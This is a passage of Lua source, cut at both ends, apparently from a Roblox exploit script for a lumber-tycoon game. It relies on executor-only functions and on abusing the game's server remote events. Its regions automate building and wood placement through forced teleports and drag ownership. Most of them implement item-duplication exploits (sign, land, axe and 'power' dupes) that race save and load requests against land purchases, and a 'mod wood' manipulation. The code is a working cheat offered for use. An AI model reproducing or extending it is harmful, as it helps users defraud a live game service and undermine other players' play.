                  if v.WoodSection.Parent.Name == Mouse.Target.Parent.Name then
                      if v.TreeClass.Value == Mouse.Target.Parent.TreeClass.Value then
                          if Mouse.Target.Parent:FindFirstChild("Owner") and tostring(v.Owner.Value) == PLY then
                              if v.WoodSection:FindFirstChild("Selection") then

                              else
                                  local bobv2 = Instance.new("SelectionBox", v.WoodSection)
                                  bobv2.Name = "Selection"
                                  bobv2.Adornee = bobv2.Parent
                                  bobv2.SurfaceTransparency = 0.5
                                  bobv2.LineThickness = 0.09
                                  bobv2.SurfaceColor3 = Color3.fromRGB(0,0,0)
                                  bobv2.Color3 = Color3.fromRGB(0,172,240)

                              end
                          end
                      end
                  end
              end
          end
      end)
  end
  --#endregion


  --#region AutoBuild

function convertCFrameToTable(cframe)
    local components = {cframe:GetComponents()}

    components[1] = components[1] - posforX -- X
    components[2] = components[2] - posforY --Y
    components[3] = components[3] - posforZ -- Z

    return {
        [1] = components[1],
        [2] = components[2],
        [3] = components[3],
        [4] = components[4],
        [5] = components[5],
        [6] = components[6],
        [7] = components[7],
        [8] = components[8],
        [9] = components[9],
        [10] = components[10],
        [11] = components[11],
        [12] = components[12]
    }
end






function CopyBase(file,plrbase)

    partsData = {}

    for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
        if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == plrbase then
            posforX = v:FindFirstChild("OriginSquare").Position.X
            posforY = v:FindFirstChild("OriginSquare").Position.Y
            posforZ = v:FindFirstChild("OriginSquare").Position.Z
        end
    end


    for _, part in ipairs(workspace.PlayerModels:GetDescendants()) do
        if not string.find(part.Name:lower(), "glass") and part.Name == "BuildDependentWood" then

                if part.parent:FindFirstChild("MainCFrame") and part.parent:FindFirstChild("BlueprintWoodClass") then

                if tostring(part.parent:FindFirstChild("Owner").Value) == plrbase then

                local partData = {
                    Blueprint = part.parent:FindFirstChild("ItemName").Value,
                    WoodClass = part.parent:FindFirstChild("BlueprintWoodClass").Value,
                    Position = convertCFrameToTable(part.parent:FindFirstChild("MainCFrame").Value),
                }

                table.insert(partsData, partData)
                end
            end
        end
    end


    writefile(tostring(file .. ".json"), HttpService:JSONEncode(partsData))
end


function spawnPart(partData)
    print(partData.Blueprint)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer(partData.Blueprint, CFrame.new(posforX + partData.Position[1], posforY + partData.Position[2], posforZ + partData.Position[3], partData.Position[4], partData.Position[5], partData.Position[6], partData.Position[7], partData.Position[8], partData.Position[9], partData.Position[10], partData.Position[11], partData.Position[12]), game:GetService("Players").LocalPlayer)
end



function LoadBaseFile(file)
    local userinfo = HttpService:JSONDecode(readfile(tostring(file .. ".json")))

    for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
        if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == game:GetService("Players").LocalPlayer.Name then
            posforX = v:FindFirstChild("OriginSquare").Position.X
            posforY = v:FindFirstChild("OriginSquare").Position.Y
            posforZ = v:FindFirstChild("OriginSquare").Position.Z
        end
    end

    wait(1)

    for _, partData in ipairs(userinfo) do
        if NumberofBps == 50 then
        print("hit 50 fill")
        repeat wait() until getgenv().nextpage
        NumberofBps = 0
        end

        NumberofBps = NumberofBps + 1
        spawnPart(partData)
        wait(1)

    end

end






function LoadPreview()

    for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
        if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == game:GetService("Players").LocalPlayer.Name then
            posforX = v:FindFirstChild("OriginSquare").Position.X
            posforY = v:FindFirstChild("OriginSquare").Position.Y
            posforZ = v:FindFirstChild("OriginSquare").Position.Z
        end
    end



    for i, v in pairs(workspace.Preview:GetDescendants()) do
        if v:IsA("BasePart") then
        local currentPosition = v.Position
        local treeclass = v.Parent:FindFirstChild("TreeClass").Value
        v.Position = currentPosition + Vector3.new(posforX, posforY, posforZ)

        local material = treeclass == "LoneCave" and Enum.Material.Foil
        or treeclass == "Frost" and Enum.Material.Ice
        or treeclass == "Spooky" and Enum.Material.Granite
        or treeclass == "SnowGlow" and Enum.Material.SmoothPlastic
        or treeclass == "CaveCrawler" and Enum.Material.Neon
        or treeclass == "SpookyNeon" and Enum.Material.Neon
        or Enum.Material.Wood


        local color = treeclass == "SpookyNeon" and Color3.fromRGB(170, 85, 0)
		or treeclass == "Spooky" and Color3.fromRGB(170, 85, 0)
		or treeclass == "CaveCrawler" and Color3.fromRGB(16, 42, 220)
		or treeclass == "LoneCave" and Color3.fromRGB(248,248,248)
		or treeclass == "SnowGlow" and Color3.fromRGB(255,255,0)
		or treeclass == "Frost" and Color3.fromRGB(159,243,233)
		or treeclass == "Volcano" and Color3.fromRGB(255, 0, 0)
        or treeclass == "GreenSwampy" and Color3.fromRGB(52, 142, 64)
        or treeclass == "GoldSwampy" and Color3.fromRGB(226, 155, 64)
        or treeclass == "Cherry" and Color3.fromRGB(163, 75, 75)
        or treeclass == "Pine" and Color3.fromRGB(215, 197, 154)
        or treeclass == "Walnut" and Color3.fromRGB(105, 64, 40)
        or treeclass == "Oak" and Color3.fromRGB(234, 184, 146)
        or treeclass == "Birch" and Color3.fromRGB(205, 205, 205)
        or treeclass == "Koa" and Color3.fromRGB(143, 76, 42)
        or treeclass == "Generic" and Color3.fromRGB(204, 142, 105)
        or treeclass == "Palm" and Color3.fromRGB(226, 220, 188)
        or treeclass == "Pine" and Color3.fromRGB(215, 197, 154)
        or treeclass == "Walnut" and Color3.fromRGB(105, 64, 40)

        if v.Transparency == 0.5 then
            v.Color = color
            v.Material = material
        end

        end
    end

    local pre = {}

    for i,v in pairs(workspace.Preview:GetChildren()) do
        table.insert(pre,v:FindFirstChild("BuildDependentWood"))
    end

    for i,v in pairs(workspace.PlayerModels:GetChildren()) do
        if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and v:FindFirstChild("Type") and v.Type.Value == "Structure" and v:FindFirstChild("MainCFrame") then
            for i,v in pairs(v:GetChildren()) do
                if v.Name == 'BuildDependentWood' then
                    for k,l in pairs(pre) do
                        local pos1 = l.CFrame.Position
                        local pos2 = v.CFrame.Position
                        local reconstructed1 = Vector3.new(math.floor(pos1.X),math.floor(pos1.Y),math.floor(pos1.Z))
                        local reconstructed2 = Vector3.new(math.floor(pos2.X),math.floor(pos2.Y),math.floor(pos2.Z))
                        if reconstructed1 == reconstructed2 then
                            if l.Parent ~= nil then l.Parent:Destroy() end
                        end
                    end
                end
            end
        end
    end
end

  --#endregion


  --#region Autofill
  function SelectionTpWOOD(tpitemspeedW, owner)
     local selectedWood = {}
     local selectedBlueprints = {}

     for _, v in ipairs(game.Workspace.PlayerModels:GetDescendants()) do
         if v:FindFirstChild("Selection") then
             table.insert(selectedWood, v)
         elseif v.Name == "Type" and v.Value == "Blueprint" and tostring(v.Parent.Owner.Value) == owner and v.Parent:FindFirstChild("BuildDependentWood") and v.Parent.BuildDependentWood.Transparency ~= 1 then
             table.insert(selectedBlueprints, v.Parent.BuildDependentWood)
         end
     end



     local numBlueprints = math.min(#selectedWood, #selectedBlueprints)



     for i = 1, numBlueprints do
         local woodPiece = selectedWood[i]
         local correspondingBlueprint = selectedBlueprints[i]

         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(woodPiece:FindFirstChild("Selection").Parent.CFrame.p) * CFrame.new(5, 0, 0)

         task.wait(tpitemspeedW)

         if not woodPiece.Parent.PrimaryPart then
             woodPiece.Parent.PrimaryPart = woodPiece:FindFirstChild("Selection").Parent
         end


         local Freeze, Pos = Instance.new("BodyVelocity", woodPiece), Instance.new("BodyPosition", woodPiece)
         Freeze.Velocity = Vector3.new(0, 0, 0)
         Freeze.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
         Freeze.P = 9000
         Pos.MaxForce = Vector3.new(0, 0, 0)
         Pos.P = 100000

         pcall(function()
         while not isnetworkowner(woodPiece.Selection.Parent) do
             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)
             task.wait(tpitemspeedW)
         end

         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)

         woodPiece.Selection.Parent:PivotTo(correspondingBlueprint.CFrame)
         end)

         spawn(function()
             wait(5)
             Freeze:Destroy()
             Pos:Destroy()
         end)
     end
 end

 local wpcf = {}
 local numBlueprints = 0


 local function getSize(plank,max,min)
     local x,y,z = plank.Size.X,plank.Size.Y,plank.Size.Z
     local calculated = (x*y*z)
     if calculated <= max and calculated >= min then return true end
     return false
 end



 local function fillPreviewsWithColors(waitTime)
     local selectedWood = {}
     local woodPiece
     local typewood
     local correspondingBlueprint

     for i,v in pairs(workspace.Preview:GetChildren()) do
        wpcf[v.PrimaryPart.CFrame] = {v,v.TreeClass.Value}
    end

     for i,v in pairs(workspace.PlayerModels:GetChildren()) do
         if v:FindFirstChild("WoodSection") and v:FindFirstChild("TreeClass") and v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and getSize(v.WoodSection,3,1) then
             selectedWood[v.WoodSection] = v.TreeClass.Value
         end
     end

     for i,v in pairs(wpcf) do
         numBlueprints = numBlueprints + 1
     end


     for i = 1, numBlueprints do
         for i,v in pairs(wpcf) do
             correspondingBlueprint = i
             typewood = v[2]
         end

         for i,v in pairs(selectedWood) do
             if v == typewood then
                 woodPiece = i
             end
         end

         game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer(wpcf[correspondingBlueprint][1].Name,correspondingBlueprint,game.Players.LocalPlayer)
         local oldTick = tick()
         wpcf[correspondingBlueprint][1]:Destroy()
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(woodPiece.CFrame.p) * CFrame.new(5, 0, 0)
         local oldCF = CFrame.new(woodPiece.CFrame.p) * CFrame.new(5, 0, 0)


         pcall(function()
             if not woodPiece.Parent.PrimaryPart then
                 woodPiece.Parent.PrimaryPart = woodPiece
             end
         end)

         while not isnetworkowner(woodPiece) do
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(woodPiece.CFrame.p) * CFrame.new(5, 0, 0)
             oldCF = CFrame.new(woodPiece.CFrame.p) * CFrame.new(5, 0, 0)
             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)
             task.wait(0.05)
         end

         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)

         woodPiece:PivotTo(correspondingBlueprint)


         local Freeze, Pos = Instance.new("BodyVelocity", woodPiece), Instance.new("BodyPosition", woodPiece)
         Freeze.Velocity = Vector3.new(0, 0, 0)
         Freeze.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
         Freeze.P = 9000
         Pos.MaxForce = Vector3.new(0, 0, 0)
         Pos.P = 100000
         local tick2 = tick()
         repeat task.wait()

           if not isnetworkowner(woodPiece) then
             repeat
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(woodPiece.CFrame.p) * CFrame.new(5, 0, 0)
             task.wait(0.05)
             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)
             task.wait(0.05)
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCF
             task.wait(0.05)
             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)
             until isnetworkowner(woodPiece)
         end

             if tick() - tick2 >= 2.5 then
                 for i = 1,10 do
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(woodPiece.CFrame.p) * CFrame.new(5, 0, 0)
                 task.wait(0.05)
                 game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)
                 task.wait(0.05)
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCF
                 task.wait(0.05)
                 game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(woodPiece.Parent)
                 end
             end

             task.wait(waitTime)
             woodPiece:PivotTo(correspondingBlueprint)
             print(isnetworkowner(woodPiece))


         until woodPiece.Parent == nil

         wpcf[correspondingBlueprint] = nil
         selectedWood[woodPiece] = nil

        print(tick()-oldTick)

        repeat task.wait()

        until tick()-oldTick >= 1

     end
 end

 --#endregion


   --#region Blueprint options
  function Destroybp()
      for i,v in pairs(game:GetService("Workspace").PlayerModels:GetDescendants()) do
          if v.Name == "Selection" and "BuildDependentWood" then
              --game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Parent.CFrame.p) * CFrame.new(5,0,0)
              game:GetService("ReplicatedStorage").Interaction.DestroyStructure:FireServer(v.Parent.Parent)
              wait(1)
          end
      end
  end
  --#endregion


   --#region SignDupe
  local SelectPurchase = game:GetService("Players").LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase
  local VirtualInputManager = game:GetService("VirtualInputManager")
  local PlayerModels = game:GetService("Workspace").PlayerModels

  function things(bestslotnum,Mainacc)
      for _, property in ipairs(game:GetService("Workspace").Properties:GetChildren()) do
          local owner = property.Owner
          if owner and owner.Value == nil then
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(property, property.OriginSquare.Position)
              game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = property.OriginSquare.CFrame + Vector3.new(0, 2, 0)
              break
          end
      end
      wait(1.5)
      for _, model in ipairs(PlayerModels:GetChildren()) do
          if model:FindFirstChild("Owner") and model.Owner.Value == game:GetService("Players").LocalPlayer then
              --check if sign has been used
              if model:FindFirstChild("Used") then
              else
                  local itemName = model.ItemName and model.ItemName.Value
                  if itemName == "PropertySoldSign" then
                      game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(model.Main.CFrame.p) + Vector3.new(0, 0, 2)
                      game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(model, "Take down sold sign")

                      for i = 1,5 do
                      game:GetService("ReplicatedStorage").Interaction.ClientIsDragging:FireServer(model)
                      model.Main.CFrame = game:GetService("Players")[Mainacc].Character.HumanoidRootPart.CFrame
                      task.wait(0.2)
                      end

                      game:GetService("ReplicatedStorage").Interaction.ClientIsDragging:FireServer(model)
                      model.Main.CFrame = game:GetService("Players")[Mainacc].Character.HumanoidRootPart.CFrame
                      --mark sign as used
                      local used = Instance.new("BoolValue")
                      used.Name = "Used"
                      used.Value = true
                      used.Parent = model
                      coroutine.wrap(function()
                          game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(bestslotnum, game:GetService("Players").LocalPlayer)
                      end)()
                      break
                  end
              end
          end
      end
  end

  function startnewdupe()
      while getgenv().SoldSignAutoFarm do
          things(getgenv().bestnummfordupe,getgenv().Nameforsingdupe)
          repeat wait() until SelectPurchase.Visible
          local gui = SelectPurchase.Quit
          local width, height = gui.AbsoluteSize.X, gui.AbsoluteSize.Y
          local x, y = gui.AbsolutePosition.X, gui.AbsolutePosition.Y
          local centerX, centerY = x + width / 2, y + height / 2
          while SelectPurchase.Visible do
              VirtualInputManager:SendMouseButtonEvent(centerX, centerY + 50, 0, true, game, 0)
              VirtualInputManager:SendMouseButtonEvent(centerX, centerY + 50, 0, false, game, 0)
              wait(0.1)
          end
          wait(1)
      end
  end

  function Signstuff()
      local count = 0
      for i,v in pairs(game:GetService("Workspace").PlayerModels:GetDescendants()) do
          if v.Name == "PropertySoldSign" then
              count = count + 1
          end
      end
      notifications:message{Title = "Butter",Description = "You have " ..count.. " Signs",Icon = 6023426926}
  end
  --#endregion


   --#region Time Maxland
  function BaseDupe()

  local tplot = nil

  repeat
      task.wait()
  until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)


  task.wait()
  task.spawn(function()
  game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(slotnumber, game.Players.LocalPlayer)
  end)
  repeat wait() until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI:WaitForChild("SelectPurchase").Visible == true

  wait(0.5)
  for m, c in ipairs(getconnections(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase:WaitForChild("Left").MouseButton1Click)) do
      c.Function()
      task.wait()
  end

  wait(0.1)
  for m, c in ipairs(getconnections(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase:WaitForChild("Left").MouseButton1Click)) do
      c.Function()
      task.wait()
  end
  wait(0.25)

  repeat
      task.wait()
      for _, cat in ipairs(game.Workspace:FindFirstChild("Effects"):GetChildren()) do
          if cat.Name == "StructureModel" and cat:FindFirstChild("OriginSquare") then
              local originSquare = cat:FindFirstChild("OriginSquare")
              if originSquare.Position ~= Vector3.new(0, 0, 0) then
                  tplot = originSquare.Position
                  break
              end
          end
      end
  until tplot ~= nil

  wait(0.1)

  for i, v in ipairs(getconnections(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase:WaitForChild("Purchase").MouseButton1Click)) do
      v.Function()
      task.wait()
  end

  repeat task.wait() until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI:WaitForChild("ConfirmPurchase").Visible == true
  for _, n in ipairs(getconnections(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.ConfirmPurchase:WaitForChild("Purchase").MouseButton1Click)) do
      n.Function()
      task.wait()
  end
  task.wait(dupewaittime)
  for i,v in ipairs(game:GetService("Workspace").Properties:GetChildren()) do
      if v.OriginSquare.Position ~= tplot then
          game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(v,v.OriginSquare.Position)
          break
      end
  end
  game:Shutdown()
  end

  function getdupetime()
      repeat wait() until game.Players.LocalPlayer.IsBuyingLand.Value
      repeat wait() until not game.Players.LocalPlayer.IsBuyingLand.Value

      local startTime = tick()

      repeat wait() until not game.Players.LocalPlayer.CurrentlySavingOrLoading.Value

      local endTime = tick()
      local elapsedTime = endTime - startTime

      notifications:message{Title = "Butter",Description = "Time elapsed: ".. string.format("%.2f", elapsedTime).. " seconds",Icon = 6023426926}
  end
  --#endregion


  --#region Get DataSize
  function DoesSaveExist(Value)
     local Data = game:GetService("ReplicatedStorage").LoadSaveRequests.GetMetaData:InvokeServer(game.Players.LocalPlayer)

     for i = 1, #Data do
         if i == Value and Data[i].SaveMeta[#Data[i].SaveMeta] then
             return Data[i].SaveMeta[#Data[i].SaveMeta].NumKeys
         end
     end

      return false
  end
 --#endregion


   --#region Mimir Maxland dupe

  function MaxDupe(LITV,MimirV,SlotNum)
  notifications:message{Title = "Butter",Description = "Started Dupe, Wait!",Icon = 6023426926}

  repeat
      task.wait()
  until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)


  task.wait()
  task.spawn(function()
  game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(SlotNum, game.Players.LocalPlayer)
  end)

  repeat wait() until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI:WaitForChild("SelectPurchase").Visible == true

  wait(0.5)
  for m, c in ipairs(getconnections(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase:WaitForChild("Left").MouseButton1Click)) do
      c.Function()
      task.wait()
  end

  wait(0.1)
  for m, c in ipairs(getconnections(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase:WaitForChild("Left").MouseButton1Click)) do
      c.Function()
      task.wait()
  end
  wait(0.25)


  if MimirV then
  FreeLand()
  wait(0.5)
  pcall(function()
  local Dupehighlight = Instance.new("Highlight") Dupehighlight.Parent = GetPlot().OriginSquare GetPlot().OriginSquare.Color = Color3.fromRGB(255,0,0)
  end)
  end

  local folder = game:GetService("Workspace").Effects.StructureModel

  local children = folder:GetChildren()
  local lastItem = children[#children - LITV]


  local greenitem = lastItem.Name


  local greenitemsize = (lastItem:FindFirstChild("Main") and lastItem.Main.Size) or (lastItem:FindFirstChild("WoodSection") and lastItem.WoodSection.Size) or (lastItem:FindFirstChild("BuildDependentWood") and lastItem.BuildDependentWood.Size)


  print("Item to leave on:", greenitem)
  print("Size:", greenitemsize)


 wait(1)
  local Added = game:GetService("Workspace").PlayerModels.ChildAdded:Connect(function(v)
      if v:WaitForChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
          if v.Name == greenitem then

              if v:FindFirstChild("Main") then
                if v.Main.Size == greenitemsize then
                  game:Shutdown()
                end

              elseif v:FindFirstChild("WoodSection") then
                if v.WoodSection.Size == greenitemsize then
                  game:Shutdown()
                end
              end

             elseif v:FindFirstChild("BuildDependentWood") then
                 if v.BuildDependentWood.Size == greenitemsize then
                   game:Shutdown()
                 end
               end

          end
      end)
      notifications:message{Title = "Mimir",Description = "Done Load in a base! NOT ON THE RED LAND!",Icon = 6023426926}
  end
  --#endregion


  --#region Countitems
 function Countitems()

 function getItemInfo(name, itemType)
     for _, item in ipairs(items) do
         if item.name == name and item.type == itemType then
             return item
         end
     end
     return nil
 end

 function insertOrUpdateItem(name, itemType)
     item = getItemInfo(name, itemType)
     if not item then
         table.insert(items, {name = name, amount = 1, type = itemType})
     else
         item.amount = item.amount + 1
     end
 end

 local function processPlayerModel(playerModel)
     main = playerModel:FindFirstChild("Main")
     owner = playerModel:FindFirstChild("Owner")
     itemName = playerModel:FindFirstChild("ItemName") or playerModel:FindFirstChild("PurchasedBoxItemName") or playerModel:FindFirstChild("TreeClass")
     typeValue = playerModel:FindFirstChild("Type")

     if main and owner and owner.Value == game.Players.LocalPlayer and typeValue then
         local itemType = typeValue.Value == "Tool" and "Box" or typeValue.Value
         insertOrUpdateItem(itemName.Value, itemType)
     end
 end

 for _, playerModel in pairs(workspace.PlayerModels:GetChildren()) do
     processPlayerModel(playerModel)
 end

 for _, item in pairs(items) do
     print(item.name .. " : " .. tostring(item.amount) .. " as: " .. item.type)
 end

 end
 --#endregion


   --#region Axe Dupe
    function AxeDupe(slot,timewait)

    if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
        notifications:message{Title = "WAIT!",Description = "Please wait :)",Icon = 6023426926}
        repeat task.wait() until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
    end
    task.spawn(function()
    game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(slot,game:GetService("Players").LocalPlayer)
    end)

    task.wait(timewait)

    workspace.Gravity = 10000000000000
    plr = game.Players.LocalPlayer
    hum = plr.Character.HumanoidRootPart
    hum.CFrame = CFrame.new(x, -100, z)
    local pos = Vector3.new(Coordinates)
    local ts = game:GetService('TweenService')
    local plr = game.Players.LocalPlayer
    local Char = plr.Character or plr.CharacterAdded:wait()
    local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0.1 --[[ time ]]), {CFrame = CFrame.new(x,-280,z)}  )
    t:Play()
    wait(2)
    workspace.Gravity = 196.2
    end
    --#endregion


   --#region Power dupe
 function PowerDupe(Slotnum)
     if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
         notifications:message{Title = "WAIT!",Description = "Please wait :)",Icon = 6023426926}
         repeat task.wait() until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
     end
     game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(math.huge,Player)
     wait(0.3)
     repeat wait() until not Player.CurrentlySavingOrLoading.Value
     FreeLand()
     SetSlotTo(Slotnum)
     wait(0.3)
     game:GetService("ReplicatedStorage").LoadSaveRequests.RequestSave:InvokeServer(Slotnum,Player)
     notifications:message{
         Title = "Butter",
         Description = "Powerdupe is done!",
         Icon = 6023426926
     }
 end
  --#endregion


   --#region ModWood
  local ModWoodOn = false
  local worked = false
  local treelimbblist = {}
  local ModwoodConnection
  local addedstuff


  function ifworked()
  worked = false
  addedstuff = game:GetService("Workspace").LogModels.ChildAdded:Connect(function(v)
      if v:WaitForChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
          if v:WaitForChild("WoodSection") then
              worked = true
          end
      end
  end)
  end

  function ModWood()

     SelectSawmill("Mod Wood")

     repeat wait() until ModWoodSawmill

     notifications:message{
         Title = "Butter",
         Description = "Click a tree",
         Icon = 6023426926
     }

     ModWoodOn = true
     if not ModWoodOn then return end
     ModwoodConnection = game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
         local Clicked = game.Players.LocalPlayer:GetMouse().Target
         if Clicked.Parent:FindFirstAncestor("LogModels") then
             if Clicked.Parent:FindFirstChild("Owner") and Clicked.Parent.Owner.Value == game.Players.LocalPlayer then
                 for _,v in pairs(Clicked.Parent:GetDescendants()) do
                     if v.Name == 'ChildIDs' and #(v:GetChildren()) == 0 then
                         table.insert(treelimbblist, v.Parent.ID.Value)
                     end
                 end
                 table.sort(treelimbblist)

                 for _,v in pairs(Clicked.Parent:GetDescendants()) do
                     if v.Name == 'ChildIDs' then
                         for _,v2 in pairs(v:GetChildren()) do
                             if v2.Value == treelimbblist[#treelimbblist] then
                                 parentbranch = v2.Parent.Parent
                                 Instance.new("Highlight", parentbranch)
                             end
                         end
                     else
                         if v.Name == 'ID' and v.Value == treelimbblist[#treelimbblist] then
                             Instance.new("Highlight", v.Parent).FillColor = Color3.new(0, 1, 0)
                             childbranchId = treelimbblist[#treelimbblist]
                             childbranch = v.Parent
                         end
                     end
                 end
             end
         end
     end)

     repeat wait() until childbranch



     local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

     local LavaPart = GetLava()

     firstpart = childbranch.Parent:FindFirstChild("WoodSection")

     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = firstpart.CFrame
     wait(0.2)



     repeat wait()

         while not isnetworkowner(parentbranch) do
             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(parentbranch.Parent)
             task.wait()
         end

         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(parentbranch.Parent)

         parentbranch:PivotTo(CFrame.new(-1425, 489, 1244))

         firetouchinterest(parentbranch, LavaPart.Lava, 0)
         firetouchinterest(parentbranch, LavaPart.Lava, 1)

     until parentbranch:FindFirstChild('LavaFire')

     ResizeBar(1,3)

     firstpart = childbranch.Parent:FindFirstChild("WoodSection")

     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = firstpart.CFrame

     wait(0.3)

     while not isnetworkowner(firstpart) do
         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(firstpart.Parent)
         firstpart.Velocity = Vector3.new(0,0,0)
         childbranch.Velocity = Vector3.new(0,0,0)
         task.wait()
     end

     game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(firstpart.Parent)

     firstpart:PivotTo(CFrame.new(-1055, 291, -458))

     wait(0.3)


     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = childbranch.CFrame * CFrame.new(5,0,0)

     while not isnetworkowner(childbranch) do
         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(childbranch.Parent)
         task.wait()
     end

     game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(childbranch.Parent)

     childbranch:PivotTo(CFrame.new(-1055, 291, -458))



     parentbranch:FindFirstChild('LavaFire'):Destroy()
     parentbranch:FindFirstChild('BodyAngularVelocity'):Destroy()
     parentbranch:FindFirstChild('BodyVelocity'):Destroy()

     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = parentbranch.CFrame

     wait(0.1)

     repeat
         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(parentbranch.Parent)
         parentbranch:PivotTo(CFrame.new(314.54, -0.5, 86.823))
         task.wait()
     until not parentbranch.Parent

     ResizeBar(2,3)

     firstpart = childbranch.Parent:FindFirstChild("WoodSection")

     ifworked()

     task.spawn(function()
         repeat wait()
         game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = firstpart.CFrame * CFrame.new(5,0,0)
         until worked
     end)

     repeat wait() game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(childbranch.Parent:FindFirstChild("CutEvent"), {["tool"] = GetBestAxe(Tree), ["faceVector"] = Vector3.new(1, 0, 0), ["height"] = 0.3, ["sectionId"] = 1,["hitPoints"] = GetAxeDamage(childbranch.Parent:FindFirstChild("TreeClass").Value), ["cooldown"] = 0.25837870788574, ["cuttingClass"] = "Axe"}) until worked
     task.wait(0.3)

     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = childbranch.CFrame * CFrame.new(5,0,0)

     while not isnetworkowner(childbranch) do
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = childbranch.CFrame * CFrame.new(5,0,0)
         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(childbranch.Parent)
         task.wait()
     end

     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = childbranch.CFrame * CFrame.new(5,0,0)

     task.wait(0.2)

     game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(childbranch.Parent)

     task.wait(0.3)
     childbranch:PivotTo(ModWoodSawmill.Particles.CFrame + Vector3.new(0, .5, 0))


     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
     ResizeBar(3,3)

     notifications:message{
         Title = "Butter",
         Description = "Done",
         Icon = 6023426926
     }

     ModWoodOn = false
     childbranch = nil
     parentbranch = nil
     worked = false
     treelimbblist = {}
     firstpart = nil
     ModWoodSawmill = nil
     addedstuff:Disconnect()
     ModwoodConnection:Disconnect()
 end

  --#endregion


   --#region 1x1 Mod wood
  function smallmodwood()
     for i,v in next, game:GetService("Workspace").PlayerModels:GetChildren() do
